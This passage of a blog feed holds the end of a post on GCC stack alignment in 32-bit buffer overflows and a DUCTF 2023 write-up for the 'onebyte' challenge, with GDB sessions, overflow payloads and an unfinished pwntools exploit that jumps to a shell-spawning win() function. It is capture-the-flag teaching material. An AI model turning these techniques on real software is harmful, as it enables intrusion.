+   0x565561c5 &amp;lt;+56&amp;gt;:	lea    esp,[ecx-0x4]
+   0x565561c8 &amp;lt;+59&amp;gt;:	ret
+End of assembler dump.
+(gdb) r
+...
+BBBBEAAA
+Program received signal SIGSEGV, Segmentation fault.
+0x565561c8 in main ()
+(gdb) i r esp
+esp            0x41414141          0x41414141
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Since &lt;em&gt;ESP = 0x41414141&lt;/em&gt;, the intended payload is the overflow value.&lt;/p&gt;
+
+&lt;p&gt;Although this is a trivial payload, the approach may be useful if you need to send, for example, shellcode or a target address. This approach is probably best for cases where you need to target a prebuilt binary and can observe these additional instructions. In other cases, you can also use GCC flags to fine-tune the stack alignment.&lt;/p&gt;
+
+&lt;h1 id=&quot;workaround-2-gcc-flags&quot;&gt;Workaround 2: GCC flags&lt;/h1&gt;
+
+&lt;p&gt;If you’re trying to follow an existing walkthrough that does not have these stack-aligning features enabled, and you just want to follow the walkthrough verbatim, you can also disable the features with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-mpreferred-stack-boundary=2&lt;/code&gt;, like:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc bof.c -o bof.out -m32 -march=i386 -fno-stack-protector -mpreferred-stack-boundary=2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The resultant disassembly should no longer have the LEA instructions:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) disas main
+Dump of assembler code for function main:
+   0x0000118d &amp;lt;+0&amp;gt;:	push   ebp
+   0x0000118e &amp;lt;+1&amp;gt;:	mov    ebp,esp
+   0x00001190 &amp;lt;+3&amp;gt;:	push   ebx
+   0x00001191 &amp;lt;+4&amp;gt;:	sub    esp,0x4
+   0x00001194 &amp;lt;+7&amp;gt;:	call   0x11b6 &amp;lt;__x86.get_pc_thunk.ax&amp;gt;
+   0x00001199 &amp;lt;+12&amp;gt;:	add    eax,0x2e5b
+   0x0000119e &amp;lt;+17&amp;gt;:	lea    edx,[ebp-0x8]
+   0x000011a1 &amp;lt;+20&amp;gt;:	push   edx
+   0x000011a2 &amp;lt;+21&amp;gt;:	mov    ebx,eax
+   0x000011a4 &amp;lt;+23&amp;gt;:	call   0x1040 &amp;lt;gets@plt&amp;gt;
+   0x000011a9 &amp;lt;+28&amp;gt;:	add    esp,0x4
+   0x000011ac &amp;lt;+31&amp;gt;:	mov    eax,0x0
+   0x000011b1 &amp;lt;+36&amp;gt;:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x000011b4 &amp;lt;+39&amp;gt;:	leave
+   0x000011b5 &amp;lt;+40&amp;gt;:	ret
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Test it with GDB:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/kali/bof.out 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
+AAAABBBBCCCCDDDDEEEEFFFF
+
+Program received signal SIGSEGV, Segmentation fault.
+0x44444444 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, we were able to deliver the payload as-is, without accounting for any four-byte offset.&lt;/p&gt;
+
+&lt;p&gt;This is probably best for cases where the vulnerable code is fairly “simple” (few custom function calls) and where you’re following someone else’s walkthrough. Should you encounter undefined behavior due to the stack alignment, you will need to put in some elbow grease: either offsetting your payloads by 4, or fine-tuning the stack-alignment flags after some research.&lt;/p&gt;</content><author><name></name></author><summary type="html">This writeup will cover GCC’s stack alignment features and how they can interfere with testing a simple 32-bit buffer overflow. GCC implement’s stack alignment by using two LEA instructions, the second of which will change the value of your payload.</summary></entry><entry><title type="html">DUCTF 2023 writeup for ‘onebyte’</title><link href="http://localhost:4000/2023/09/19/onebyte-writeup.html" rel="alternate" type="text/html" title="DUCTF 2023 writeup for ‘onebyte’" /><published>2023-09-19T00:00:00-04:00</published><updated>2023-09-19T00:00:00-04:00</updated><id>http://localhost:4000/2023/09/19/onebyte-writeup</id><content type="html" xml:base="http://localhost:4000/2023/09/19/onebyte-writeup.html">&lt;p&gt;This writeup will explain how to exploit the “onebyte” CTF challenge.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;Here’s a one byte buffer overflow!&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;static-analysis&quot;&gt;Static analysis&lt;/h1&gt;
+
+&lt;p&gt;Start with the C source code:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Free junk: 0x%lx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s analyze some key information:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The print statement will yield the address of the &lt;em&gt;init&lt;/em&gt; function&lt;/li&gt;
+  &lt;li&gt;A buffer &lt;em&gt;buf&lt;/em&gt; is declared with 16 bytes&lt;/li&gt;
+  &lt;li&gt;The insecure &lt;em&gt;read&lt;/em&gt; function will set 17 bytes into &lt;em&gt;buf&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;The &lt;em&gt;win&lt;/em&gt; function will launch a shell, although the application does not call this function directly&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;With this information, we can infer a few things:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;If we can call &lt;em&gt;win&lt;/em&gt;, we will gain a shell, and presumably gain the flag. This saves us the legwork of crafting shellcode ourselves.&lt;/li&gt;
+  &lt;li&gt;We can leverage the &lt;em&gt;read&lt;/em&gt; function call to overflow one byte outside of &lt;em&gt;buf&lt;/em&gt;.&lt;/li&gt;
+  &lt;li&gt;Using static or dynamic analysis, we can get the address of &lt;em&gt;win&lt;/em&gt; by adding the offset of &lt;em&gt;init&lt;/em&gt; - &lt;em&gt;win&lt;/em&gt; to the address given in the “free junk” output from the &lt;em&gt;printf&lt;/em&gt; call.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Observe the disassembly:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gdb onebyte
+...
+(gdb) disas main
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s trim it down to the parts that matter for the exploit:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   ...
+   0x00001239 &amp;lt;+11&amp;gt;:	mov    ebp,esp
+   0x0000123b &amp;lt;+13&amp;gt;:	push   ebx
+   0x0000123c &amp;lt;+14&amp;gt;:	push   ecx
+   0x0000123d &amp;lt;+15&amp;gt;:	sub    esp,0x10
+   ...
+   0x00001280 &amp;lt;+82&amp;gt;:	lea    eax,[ebp-0x18]
+   0x00001283 &amp;lt;+85&amp;gt;:	push   eax
+   ...
+   0x00001286 &amp;lt;+88&amp;gt;:	call   0x1050 &amp;lt;read@plt&amp;gt;
+   ...
+   0x00001293 &amp;lt;+101&amp;gt;:	lea    esp,[ebp-0x8]
+   0x00001296 &amp;lt;+104&amp;gt;:	pop    ecx
+	 ...
+   0x00001299 &amp;lt;+107&amp;gt;:	lea    esp,[ecx-0x4]
+   0x0000129c &amp;lt;+110&amp;gt;:	ret
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, let’s walk through the behavior of the stack. Start with the function prologue.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;+11&amp;gt;:	mov    ebp,esp
+&amp;lt;+13&amp;gt;:	push   ebx
+&amp;lt;+14&amp;gt;:	push   ecx
+&amp;lt;+15&amp;gt;:	sub    esp,0x10
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;First, the base pointer &lt;em&gt;EBP&lt;/em&gt; is 24 bytes below the stack pointer &lt;em&gt;ESP&lt;/em&gt;. The lowest 16 bytes are allocated for local variables. Based on the C code, we can infer that this space is reserved only for the 16-byte buffer, &lt;em&gt;buf&lt;/em&gt;. We can also infer that the original value of ECX is located at &lt;em&gt;EBP&lt;/em&gt;-8.&lt;/p&gt;
+
+&lt;p&gt;Next, at &lt;em&gt;main&lt;/em&gt;+82 and 86, the 16-byte variable &lt;em&gt;buf&lt;/em&gt; is set as the second parameter to &lt;em&gt;read&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;+82&amp;gt;:	lea    eax,[ebp-0x18]
+&amp;lt;+85&amp;gt;:	push   eax
+...
+&amp;lt;+88&amp;gt;:	call   0x1050 &amp;lt;read@plt&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, &lt;em&gt;buf&lt;/em&gt; is at &lt;em&gt;EBP&lt;/em&gt;-0x18, or &lt;em&gt;EBP&lt;/em&gt;-24. This aligns with our analysis of the prologue.&lt;/p&gt;
+
+&lt;p&gt;At &lt;em&gt;main&lt;/em&gt;+101 and 104, ECX is set to its original value, at &lt;em&gt;EBP&lt;/em&gt;-8.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;+101&amp;gt;:	lea    esp,[ebp-0x8]
+&amp;lt;+104&amp;gt;:	pop    ecx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note that this is lined up against the end of the 16-byte &lt;em&gt;buf&lt;/em&gt;. Also recall that &lt;em&gt;EPB&lt;/em&gt;-8 is exactly where the one-byte overflow would occur.&lt;/p&gt;
+
+&lt;p&gt;Finally, the return address is determined in the last two lines:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;+107&amp;gt;:	lea    esp,[ecx-0x4]
+&amp;lt;+110&amp;gt;:	ret
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Observe that the stack pointer is set to whatever data exists at &lt;em&gt;ECX&lt;/em&gt;-4. When the function returns at &lt;em&gt;main&lt;/em&gt;+110, the program will try to jump to that location and execute any assembly there. If a function exists there, the application will execute it.&lt;/p&gt;
+
+&lt;p&gt;(Note: If you’re interested in the LEA and ECX behaviors here, read my previous blog post on this topic. In short, it’s related to stack alignment. You’re likely to see this behavior in 32-bit GCC builds. You are not likey to see it in 64-bit GCC builds. For the purpose of CTF exercises, the big takeaway is that, for some 32-bit GCC builds, there’s a four-byte offset that you will need to account for whenever you deploy a payload that’s intended to exploit the return behavior.)&lt;/p&gt;
+
+&lt;p&gt;Finally, since we have an intution about the use of the “free junk” (the location of &lt;em&gt;init&lt;/em&gt;), let’s see where the two line up:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) info functions
+...
+0x000011bd  init
+0x00001203  win
+0x0000122e  main
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note that &lt;em&gt;0x1203&lt;/em&gt; - &lt;em&gt;0x11bd&lt;/em&gt; = 70, or &lt;em&gt;0x46&lt;/em&gt;. So, &lt;em&gt;init&lt;/em&gt;+70 should always point to the location of &lt;em&gt;win&lt;/em&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;dynamic-analysis&quot;&gt;Dynamic analysis&lt;/h1&gt;
+
+&lt;p&gt;The methodology is simple:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Observe the stack after our one-byte overflow&lt;/li&gt;
+  &lt;li&gt;Try to infer if there’s a way to control where the function returns&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;If we run the application many times, we will get a different location of &lt;em&gt;init&lt;/em&gt; (the “free junk”). This tells us that ASLR may affect our exploit. With that said, observe that &lt;em&gt;init&lt;/em&gt;+70 will always match the location of &lt;em&gt;win&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Let’s set some breakpoints:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) disas main
+   ...
+   0x0000128b &amp;lt;+93&amp;gt;:	add    esp,0x10
+   ...
+   0x00001299 &amp;lt;+107&amp;gt;:	lea    esp,[ecx-0x4]
+   0x0000129c &amp;lt;+110&amp;gt;:	ret
+End of assembler dump.
+(gdb) b *(main+93)
+Breakpoint 1 at 0x128b
+(gdb) b *(main+107)
+Breakpoint 2 at 0x1299
+(gdb) b *(main+110)
+Breakpoint 3 at 0x129c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Run the program with 17-byte input.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) run
+Starting program: /home/kali/onebyte 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
+Free junk: 0x565561bd
+Your turn: AAAABBBBCCCCDDDDE
+
+Breakpoint 1, 0x5655628b in main ()
+(gdb) 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Analyze the data in the stack:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/1i $pc
+=&amp;gt; 0x5655628b &amp;lt;main+93&amp;gt;:	add    esp,0x10
+(gdb) x/8wx $ebp-0x18
+0xffffd450:	0x41414141	0x42424242	0x43434343	0x44444444
+0xffffd460:	0xffffd445	0xf7e1dff4	0x00000000	0xf7c237c5
+(gdb) x/wx $ebp-0x8
+0xffffd460:	0xffffd445
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see that all 17 bytes were set, with the final byte, 0x45 (“E”), overflowing into the least-significant byte at &lt;em&gt;EBP&lt;/em&gt;-8.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) continue
+Continuing.
+
+Breakpoint 2, 0x56556299 in main ()
+(gdb) x/1i $pc
+=&amp;gt; 0x56556299 &amp;lt;main+107&amp;gt;:	lea    esp,[ecx-0x4]
+(gdb) i r ecx
+ecx            0xffffd445          -11195
+(gdb) x/x $ecx
+0xffffd445:	0x11ffffd4
+(gdb) x/x $ecx-0x4
+0xffffd441:	0x50000000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here, note that ECX is set with the overflow bit. Also observe that the current instruction will, after execution, set the stack whatever value is at &lt;em&gt;ECX&lt;/em&gt;-0x4. Let’s confirm this now.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) ni
+
+Breakpoint 3, 0x5655629c in main ()
+(gdb) x/1i $pc
+=&amp;gt; 0x5655629c &amp;lt;main+110&amp;gt;:	ret
+(gdb) i r ecx
+ecx            0xffffd445          -11195
+(gdb) i r esp
+esp            0xffffd441          0xffffd441
+(gdb) x/x $esp
+0xffffd441:	0x50000000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Recall that RET will pop the stack into the instruction pointer (literally &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop eip&lt;/code&gt;) and then try to execute any instructions at that location. However, since we have indirectly manipulated ESP to an arbitrary value (0x45 - 0x4 = 0x41), the program may jump to an arbitrary location in memory. Again, let’s confirm this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) ni
+0x50000000 in ?? ()
+(gdb) ni
+
+Program received signal SIGSEGV, Segmentation fault.
+0x50000000 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If we controlled the stack correctly, this would actually try to execute &lt;em&gt;0x41414141&lt;/em&gt;, the “AAAA” sequence from our payload. If we can manipulate the stack to do this, we should also be able to execute the location of &lt;em&gt;win&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Let’s see what we &lt;em&gt;can&lt;/em&gt; do with the stack.&lt;/p&gt;
+
+&lt;h1 id=&quot;controlling-the-stack&quot;&gt;Controlling the stack&lt;/h1&gt;
+
+&lt;p&gt;Revisit the stack addresses and data at &lt;em&gt;main&lt;/em&gt;+93, right after we set the overflow:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/8wx $ebp-0x18
+0xffffd450:	0x41414141	0x42424242	0x43434343	0x44444444
+0xffffd460:	0xffffd445	0xf7e1dff4	0x00000000	0xf7c237c5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Observe the following:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;ESP is eventually set to &lt;em&gt;0xffffd445&lt;/em&gt; - 4&lt;/li&gt;
+  &lt;li&gt;However, our target address is &lt;em&gt;0xffffd450&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;In hindsight, if we had set &lt;em&gt;0x50&lt;/em&gt; instead of &lt;em&gt;0x45&lt;/em&gt; (“E”) as the overflow byte, &lt;em&gt;ESP&lt;/em&gt; would have jumped to our target. Of course, ASLR will make it impossible to predict exactly which address in the stack we will need to target on any execution. However, we &lt;em&gt;do&lt;/em&gt; have control over that one byte.&lt;/p&gt;
+
+&lt;p&gt;To see what exactly the stack is doing, let’s write a simple GDB script:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set disable-randomization off
+set pagination off
+b *(main+93)
+run &amp;lt; &amp;lt;(echo &apos;AAAABBBBCCCCDDDDE&apos;)
+echo [Analyze EBP-0x18 ...]\n
+x/1i $pc
+x/8wx $ebp-0x18
+continue
+quit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then run it in a loop.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ for i in {1..5}; do gdb -x onebyte.gdb ~/onebyte | grep 0x41414141; done
+0xffa7c880:	...
+0xffe3a0e0:	...
+0xff9c72b0:	...
+0xffa12d80:	...
+0xffb26a30:	...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Notice that, on each execution, the target stack address is a power of 10 in base 16: 80, e0, b0, 30, and so forth. Run it enough, and you’ll get one that ends in 40, like:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0xff8ab340
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We know that we can control the value of that byte. We also know that, at &lt;em&gt;main&lt;/em&gt;+107, the value of the byte we send is subtracted by 4. So, if the overflow byte is &lt;em&gt;0x44&lt;/em&gt; (“D”), we should be able to point to the target stack address.&lt;/p&gt;
+
+&lt;p&gt;Let’s modify the payload and automate it in the GDB script:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;run &amp;lt; &amp;lt;(echo &apos;AAAABBBBBBBBBBBBD&apos;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The “D” should resolve to 0x40, thus targeting the “AAAA” on the stack. Modify the &lt;em&gt;grep&lt;/em&gt; command to catch the message that displays if &lt;em&gt;0x41414141&lt;/em&gt; is executed. Run this until you see results.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ for i in {1..10}; do gdb -x onebyte.gdb ~/onebyte | grep &apos;0x41414141 in \?\?&apos;; done
+0x41414141 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, given enough iterations, we can redirect control to the stack. Further, this took fewer than 10 attempts. On average, this challenge can be completed in under 30 attempts.&lt;/p&gt;
+
+&lt;p&gt;The next step is replacing the target with the address of &lt;em&gt;win&lt;/em&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;solution&quot;&gt;Solution&lt;/h1&gt;
+
+&lt;p&gt;Here’s a working solution:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Free junk: 0x&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;init_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;win_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;70&lt;/span&gt;
